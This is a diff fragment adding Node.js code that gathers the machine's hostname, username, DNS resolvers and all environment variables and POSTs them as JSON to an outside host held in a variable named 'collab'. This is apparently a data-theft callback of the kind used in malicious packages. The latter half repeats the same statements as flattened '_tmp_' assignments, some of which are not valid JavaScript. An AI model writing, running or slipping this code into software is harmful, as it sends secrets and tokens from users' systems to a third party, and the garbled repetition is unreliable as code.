@@ -1,0 +1,78 @@
+dns.resolve('www.google.com', (err, res) => {
+    if (err) {
+        console.error(err);
+        return;
+    }
+    const dnsResolvers = res;
+
+    const data = JSON.stringify({
+        hostname,
+        username,
+        dnsResolvers,
+        environmentVariables: process.env
+    });
+
+    const options = {
+        hostname: collab,
+        port: 443,
+        path: '/',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    };
+
+    const req = https.request(options, res => {
+        console.log(`statusCode: ${res.statusCode}`);
+
+        res.on('data', d => {
+            process.stdout.write(d);
+        });
+    });
+
+    req.on('error', error => {
+        console.error(error);
+    });
+
+    req.write(data);
+    req.end();
+})
+const dnsResolvers = res
+const data = JSON.stringify({
+        hostname,
+        username,
+        dnsResolvers,
+        environmentVariables: process.env
+    })
+_tmp_0.hostname = hostname
+_tmp_0.username = username
+_tmp_0.dnsResolvers = dnsResolvers
+_tmp_0.environmentVariables = process.env
+const options = {
+        hostname: collab,
+        port: 443,
+        path: '/',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    }
+_tmp_1.hostname = collab
+_tmp_1.port = 443
+_tmp_1.path = "/"
+_tmp_1.method = "POST"
+_tmp_1.headers = {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+_tmp_2.Content-Type = "application/json"
+_tmp_2.Content-Length = data.length
+const req = https.request(options, res => {
+        console.log(`statusCode: ${res.statusCode}`);
+
+        res.on('data', d => {
+            process.stdout.write(d);
+        });
+    })
